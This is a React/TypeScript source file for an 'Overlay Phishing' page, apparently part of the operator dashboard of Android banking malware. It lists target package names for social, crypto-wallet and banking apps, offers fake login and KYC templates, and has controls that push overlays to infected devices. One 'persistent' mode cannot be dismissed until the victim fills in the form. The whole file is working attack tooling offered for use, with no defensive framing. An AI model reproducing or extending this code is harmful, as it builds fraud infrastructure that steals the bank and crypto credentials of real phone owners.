import { useState, useCallback, useEffect, useRef } from 'react';
import { useOutletContext } from 'react-router-dom';
import { useDeviceData } from '@/hooks/useDeviceData';
import type { DeviceOutletContext } from '@/types';
import { clientsApi } from '@/services/api';
import { DevicePageHeader, ErrorAlert, LoadingSkeleton } from '@/components/device/shared';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Badge } from '@/components/ui/badge';
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
import {
  Layers, Play, Square, Settings, Smartphone, Lock, Eye, AlertTriangle,
  RefreshCw, CheckCircle2,
} from 'lucide-react';

interface OverlayStatus {
  enabled: boolean;
  canDrawOverlays: boolean;
  serviceRunning: boolean;
  apps: Array<{ package: string; template: string; persistent: boolean }>;
}

const TARGET_APPS = {
  social: [
    { pkg: 'com.whatsapp', name: 'WhatsApp', color: '#25D366' },
    { pkg: 'com.facebook.katana', name: 'Facebook', color: '#1877F2' },
    { pkg: 'com.instagram.android', name: 'Instagram', color: '#E4405F' },
    { pkg: 'com.zhiliaoapp.musically', name: 'TikTok', color: '#000000' },
    { pkg: 'com.twitter.android', name: 'X', color: '#000000' },
    { pkg: 'com.snapchat.android', name: 'Snapchat', color: '#FFFC00' },
    { pkg: 'com.discord', name: 'Discord', color: '#5865F2' },
    { pkg: 'com.tencent.mm', name: 'WeChat', color: '#07C160' },
    { pkg: 'com.xingin.xhs', name: 'Xiaohongshu', color: '#FF2442' },
    { pkg: 'com.vkontakte.android', name: 'VK', color: '#4C75A3' },
    { pkg: 'com.viber.voip', name: 'Viber', color: '#7360F2' },
  ],
  crypto: [
    { pkg: 'com.binance.dev', name: 'Binance', color: '#F0B90B' },
    { pkg: 'com.coinbase.android', name: 'Coinbase', color: '#0052FF' },
    { pkg: 'io.metamask', name: 'MetaMask', color: '#E2761B' },
    { pkg: 'com.bitget.exchange', name: 'Bitget', color: '#00F0FF' },
    { pkg: 'app.phantom', name: 'Phantom', color: '#AB9FF2' },
    { pkg: 'com.wallet.crypto.trustapp', name: 'Trust Wallet', color: '#3375BB' },
    { pkg: 'com.moonpay', name: 'Moonpay', color: '#7B3FE4' },
    { pkg: 'exodusmovement.exodus', name: 'Exodus', color: '#1F2033' },
    { pkg: 'com.okinc.okex.gp', name: 'OKX', color: '#000000' },
    { pkg: 'com.atomicwallet', name: 'Atomic', color: '#11198D' },
    { pkg: 'pi.blockchain.android', name: 'Blockchain.com', color: '#121D33' },
    { pkg: 'com.coinomi.wallet', name: 'Coinomi', color: '#11B8C1' },
    { pkg: 'com.crypto.exchange', name: 'Crypto.com', color: '#002D72' },
    { pkg: 'co.edgesecure.app', name: 'Edge', color: '#0E4B75' },
  ],
  finance: [
    { pkg: 'com.paypal.android.p2pmobile', name: 'PayPal', color: '#003087' },
    { pkg: 'com.chase.sig.android', name: 'Chase', color: '#117ACA' },
    { pkg: 'com.revolut.revolut', name: 'Revolut', color: '#0075EB' },
    { pkg: 'com.htx.brand', name: 'HTX', color: '#00AEEF' },
    { pkg: 'com.bybit.app', name: 'Bybit', color: '#F7A600' },
    { pkg: 'com.dydx.trading', name: 'DYDX', color: '#6966FF' },
    { pkg: 'com.allybank.mobile', name: 'AllyBank', color: '#5E17EB' },
    { pkg: 'com.capitalone.mobile', name: 'CapitalOne', color: '#004977' },
    { pkg: 'com.chimebank', name: 'ChimeBank', color: '#25C281' },
    { pkg: 'com.creditonebank.mobile', name: 'CreditOne', color: '#003366' },
    { pkg: 'com.discoverfinancial.mobile', name: 'DiscoverBank', color: '#FF6000' },
    { pkg: 'com.samsung.android.spay', name: 'Samsung Wallet', color: '#1428A0' },
    { pkg: 'com.google.android.apps.walletnfcrel', name: 'Google Wallet', color: '#4285F4' },
    { pkg: 'com.eg.android.AlipayGphone', name: 'AliPay', color: '#1677FF' },
    { pkg: 'com.boc.bocpay', name: 'BOC', color: '#A41E22' },
    { pkg: 'sg.com.hsbc.hsbcsingapore', name: 'HSBC Singapore', color: '#DB0011' },
    { pkg: 'com.alfa_bank.mbank', name: 'Alfa Bank', color: '#EF3124' },
    { pkg: 'com.bluevine.app', name: 'Bluevine', color: '#0055FF' },
    { pkg: 'com.currencyfair', name: 'CurrencyFair', color: '#00A651' },
    { pkg: 'com.greenfi.app', name: 'GREENFI', color: '#00C853' },
    { pkg: 'com.airstar.bank', name: 'AirStar', color: '#00B4D8' },
  ],
};

export default function OverlayPage() {
  const { clientId, loadClient, online } = useOutletContext<DeviceOutletContext>();
  const [selectedApps, setSelectedApps] = useState<Set<string>>(new Set());
  const [activeAppTab, setActiveAppTab] = useState<keyof typeof TARGET_APPS>('social');
  const [templateType, setTemplateType] = useState('social_login');
  const [persistent, setPersistent] = useState(true);
  const [saving, setSaving] = useState(false);
  const [toast, setToast] = useState<string | null>(null);
  const toastTimer = useRef<ReturnType<typeof setTimeout> | null>(null);

  const showToast = useCallback((msg: string) => {
    setToast(msg);
    if (toastTimer.current) clearTimeout(toastTimer.current);
    toastTimer.current = setTimeout(() => setToast(null), 3000);
  }, []);

  useEffect(() => {
    return () => { if (toastTimer.current) clearTimeout(toastTimer.current); };
  }, []);

  const { data: pageData, loading, error, refresh, commandStatus } = useDeviceData<{
    overlay_status?: OverlayStatus;
    overlay_config?: Record<string, unknown>;
  }>({
    clientId,
    page: 'overlay',
    extractData: (d) => ({
      overlay_status: d.overlay_status as OverlayStatus | undefined,
      overlay_config: d.overlay_config as Record<string, unknown> | undefined,
    }),
    dataType: ['overlay_status', 'overlay_config'],
    defaultValue: {},
  });

  const toggleApp = (pkg: string) => {
    const next = new Set(selectedApps);
    if (next.has(pkg)) next.delete(pkg);
    else next.add(pkg);
    setSelectedApps(next);
  };

  const saveConfig = useCallback(async () => {
    if (!online) { showToast('Device is offline'); return; }
    setSaving(true);
    try {
      await clientsApi.setOverlayConfig(clientId, {
        enabled: true,
        persistent,
        targetApps: JSON.stringify(Array.from(selectedApps)),
        templateType,
      });
      showToast('Overlay configuration saved');
      refresh();
    } catch (e) {
      showToast('Failed to save config');
    } finally {
      setSaving(false);
    }
  }, [clientId, online, persistent, selectedApps, templateType, refresh, showToast]);

  const triggerOverlay = useCallback(async () => {
    if (!online) { showToast('Device is offline'); return; }
    try {
      await clientsApi.triggerOverlay(clientId, {
        package: Array.from(selectedApps)[0] || 'com.whatsapp',
        template: templateType,
        persistent,
      });
      showToast('Overlay triggered on device');
    } catch (e) {
      showToast('Failed to trigger overlay');
    }
  }, [clientId, online, selectedApps, templateType, persistent, showToast]);

  const hideOverlay = useCallback(async () => {
    if (!online) { showToast('Device is offline'); return; }
    try {
      await clientsApi.hideOverlay(clientId);
      showToast('Overlay hidden');
    } catch (e) {
      showToast('Failed to hide overlay');
    }
  }, [clientId, online, showToast]);

  const clearSelection = useCallback(() => {
    setSelectedApps(new Set());
    showToast('Selection cleared');
  }, [showToast]);

  const status = pageData?.overlay_status;

  return (
    <div className="space-y-4">
      {toast && (
        <div className="fixed top-4 right-4 z-50 flex items-center gap-2 px-4 py-2 rounded-lg bg-indigo-600 text-white text-sm shadow-lg animate-in fade-in slide-in-from-top-2">
          <CheckCircle2 className="h-4 w-4" />
          {toast}
        </div>
      )}

      <DevicePageHeader
        title="Overlay Phishing"
        online={online}
        commandStatus={commandStatus}
        refresh={refresh}
        actions={[
          { label: 'Refresh', icon: RefreshCw, onClick: () => void refresh() },
          { label: 'Clear Selection', icon: Lock, onClick: clearSelection, variant: 'outline' },
        ]}
      />

      {error && <ErrorAlert message={error} onRetry={refresh} />}
      {loading && !status && <LoadingSkeleton rows={3} />}

      <div className="grid grid-cols-1 xl:grid-cols-3 gap-4">
        <Card className="xl:col-span-2">
          <CardHeader>
            <CardTitle className="text-sm flex items-center gap-2">
              <Smartphone className="h-4 w-4" />
              Target Applications — {selectedApps.size} selected
            </CardTitle>
          </CardHeader>
          <CardContent>
            <Tabs value={activeAppTab} onValueChange={(v) => setActiveAppTab(v as keyof typeof TARGET_APPS)} className="w-full">
              <TabsList className="grid w-full grid-cols-3">
                {Object.entries(TARGET_APPS).map(([category, apps]) => (
                  <TabsTrigger
                    key={category}
                    value={category}
                    className="text-xs"
                  >
                    {category.charAt(0).toUpperCase() + category.slice(1)} ({apps.length})
                  </TabsTrigger>
                ))}
              </TabsList>
              {Object.entries(TARGET_APPS).map(([category, apps]) => (
                <TabsContent key={category} value={category} className="mt-4">
                    <div className="grid grid-cols-2 sm:grid-cols-3 gap-2">
                      {apps.map((app) => (
                        <button
                          key={app.pkg}
                          onClick={() => toggleApp(app.pkg)}
                          className={`flex items-center gap-2 p-2 rounded-md border text-left transition-colors ${
                            selectedApps.has(app.pkg)
                              ? 'border-indigo-500/50 bg-indigo-500/10'
                              : 'border-border hover:bg-accent'
                          }`}
                        >
                          <div
                            className="w-7 h-7 rounded flex items-center justify-center text-[10px] font-bold text-white shrink-0"
                            style={{ backgroundColor: app.color }}
                          >
                            {app.name[0]}
                          </div>
                          <div className="min-w-0">
                            <div className="text-xs font-medium truncate">{app.name}</div>
                            <div className="text-[10px] text-muted-foreground truncate">{app.pkg}</div>
                          </div>
                          {selectedApps.has(app.pkg) && <Eye className="h-3 w-3 text-indigo-400 ml-auto shrink-0" />}
                        </button>
                      ))}
                    </div>
                  </TabsContent>
              ))}
            </Tabs>
          </CardContent>
        </Card>

        <div className="space-y-4">
          <Card>
            <CardHeader>
              <CardTitle className="text-sm flex items-center gap-2">
                <Settings className="h-4 w-4" />
                Configuration
              </CardTitle>
            </CardHeader>
            <CardContent className="space-y-3">
              <div className="space-y-1">
                <label className="text-xs font-medium">Template Type</label>
                <select
                  value={templateType}
                  onChange={(e) => setTemplateType(e.target.value)}
                  className="w-full p-2 rounded-md border border-border bg-background text-xs"
                >
                  <option value="social_login">Social Login</option>
                  <option value="crypto_wallet">Crypto Wallet</option>
                  <option value="bank_login">Bank Login</option>
                  <option value="kyc_identity">KYC Identity</option>
                  <option value="finance_verify">Finance Verify</option>
                </select>
              </div>

              <div className="flex items-center justify-between p-2 rounded-md border border-border">
                <div className="flex items-center gap-2">
                  <Lock className="h-3 w-3 text-amber-400" />
                  <span className="text-xs font-medium">Persistent</span>
                </div>
                <button
                  onClick={() => setPersistent(!persistent)}
                  className={`w-9 h-5 rounded-full transition-colors ${persistent ? 'bg-indigo-500' : 'bg-muted'}`}
                >
                  <div className={`w-4 h-4 rounded-full bg-white shadow-sm transition-transform ${persistent ? 'translate-x-4' : 'translate-x-0.5'}`} />
                </button>
              </div>

              <div className="p-2 rounded-md border border-amber-500/20 bg-amber-500/5">
                <div className="flex items-start gap-2">
                  <AlertTriangle className="h-3 w-3 text-amber-400 mt-0.5 shrink-0" />
                  <p className="text-[10px] text-amber-200/80 leading-relaxed">
                    Persistent overlays cannot be dismissed without filling the form. Reappears on app relaunch.
                  </p>
                </div>
              </div>

              <Button onClick={saveConfig} disabled={saving || !online} size="sm" className="w-full">
                {saving ? 'Saving...' : 'Save Configuration'}
              </Button>
            </CardContent>
          </Card>

          <Card>
            <CardHeader>
              <CardTitle className="text-sm flex items-center gap-2">
                <Play className="h-4 w-4" />
                Manual Control
              </CardTitle>
            </CardHeader>
            <CardContent className="space-y-2">
              <Button onClick={triggerOverlay} disabled={!online} size="sm" className="w-full bg-indigo-600 hover:bg-indigo-700">
                <Play className="h-3 w-3 mr-1" />
                Trigger Overlay
              </Button>
              <Button onClick={hideOverlay} disabled={!online} variant="outline" size="sm" className="w-full">
                <Square className="h-3 w-3 mr-1" />
                Hide Overlay
              </Button>
            </CardContent>
          </Card>

          {status && (
            <Card>
              <CardHeader>
                <CardTitle className="text-sm">Device Status</CardTitle>
              </CardHeader>
              <CardContent className="space-y-2">
                <div className="flex justify-between text-xs">
                  <span className="text-muted-foreground">Service</span>
                  <Badge variant={status.serviceRunning ? 'default' : 'secondary'} className="text-[10px]">
                    {status.serviceRunning ? 'Active' : 'Inactive'}
                  </Badge>
                </div>
                <div className="flex justify-between text-xs">
                  <span className="text-muted-foreground">Overlay Permission</span>
                  <Badge variant={status.canDrawOverlays ? 'default' : 'destructive'} className="text-[10px]">
                    {status.canDrawOverlays ? 'Granted' : 'Denied'}
                  </Badge>
                </div>
                <div className="flex justify-between text-xs">
                  <span className="text-muted-foreground">Global Enabled</span>
                  <Badge variant={status.enabled ? 'default' : 'secondary'} className="text-[10px]">
                    {status.enabled ? 'Yes' : 'No'}
                  </Badge>
                </div>
                <div className="flex justify-between text-xs">
                  <span className="text-muted-foreground">Mapped Apps</span>
                  <span className="font-mono text-[10px]">{status.apps?.length || 0}</span>
                </div>
              </CardContent>
            </Card>
          )}
        </div>
      </div>
    </div>
  );
}
